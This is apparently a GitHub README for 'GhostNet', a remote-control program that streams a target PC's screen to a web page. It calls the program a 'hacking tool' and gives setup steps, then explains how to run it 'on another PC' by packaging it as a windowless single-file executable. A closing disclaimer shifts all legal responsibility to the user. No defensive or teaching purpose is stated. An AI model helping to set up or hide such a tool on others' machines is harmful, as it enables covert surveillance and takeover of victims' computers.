# GhostNet

"**GhostNet**" is a program that allows remote control of a computer.  
It transmits the target's screen, enabling remote control from a web page.

## Installation
To install burgle, follow these simple steps:

1. ⬇️ Download:
   1. [Download](https://github.com/Quema100/GhostNet/archive/refs/heads/main.zip) file.
   2. Use Git
     ```ps1
        git clone https://github.com/Quema100/GhostNet.git
      ```
2. 📁 Install Moudules: ``npm (or pnpm) i`` with install python moudules. ([Python Moudule List][list])
3. ⚒️ Fix Server Address: 
    - js:
        ```js
         socket = new WebSocket('ws://your-server-address:${port}');
        ```

    - Python:
        ```py 
         server = websockets.serve(controller.handle_connection, "your-server-address", 8765)
        ```

4. 🏃‍♀️ Start GhostNet: 
    
    - start hacking tool:
        ```ps
        python main.py
        ```
    - start web server:
        ```ps
        npm (or pnpm) start
        ```
        
### **How to run this program on another PC**
To run this program on another PC, follow these simple steps:

1. Install: install pyinstaller
    
    - terminal
        ``` ps
        pip install pyinstaller
        ```
2. Build:
    - terminal
        ``` ps
        pyinstaller -w -F -n=GhostNet ./main.py
        ```

> [!WARNING]  
> This template is a tool developed for specific purposes.  
> **Improper use of this project may result in illegal outcomes, and the responsibility lies solely with the user.**  
>**The creator assumes no responsibility for any legal or ethical issues arising from the use of this template.**

[list]: ./requirements.txt

